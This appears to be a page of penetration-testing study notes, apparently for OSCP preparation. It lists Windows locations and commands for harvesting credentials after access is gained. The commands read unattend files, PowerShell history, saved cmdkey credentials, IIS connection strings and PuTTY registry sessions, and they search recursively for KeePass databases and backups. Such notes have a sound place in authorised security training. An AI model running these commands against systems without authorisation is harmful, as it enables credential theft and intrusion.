---
description: You could discover credentials in several different locations.
---

# Initial Harvesting - Usual Spots

### Unattended Windows Installations

```bash
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

### Powershell History

{% code overflow="wrap" %}
```bash
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
{% endcode %}

### Saved Windows Credentials

```bash
cmdkey /list
runas /savecred /user:<username> cmd.exe
```

### IIS Configuration

{% code overflow="wrap" %}
```bash
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```
{% endcode %}

### Retrieve Credentials from Software: PuTTY

```bash
reg query HKEY_CURRENT_USER\Software\<Username>\PuTTY\Sessions\ /f "Proxy" /s
```

### File Mining to find Creds on Windows hosts

{% code overflow="wrap" %}
```bash
PS> Get-ChildItem -Path C:\users -Include *.sam,*.txt,*.ps1,*.log,*.exe,*.kdbx,*.gitconfig,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

PS> Get-ChildItem -Path / -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue  // this one will look for kdbx files which contain a password manager database

PS> Get-ChildItem -Path C:\ -Include backup.* -File -Recurse -ErrorAction SilentlyContinue

# OSCP
PS> Get-ChildItem -Path C:\ -Include local.txt -File -Recurse -ErrorAction SilentlyContinue
PS> Get-ChildItem -Path C:\ -Include proof.txt -File -Recurse -ErrorAction SilentlyContinue
```
{% endcode %}
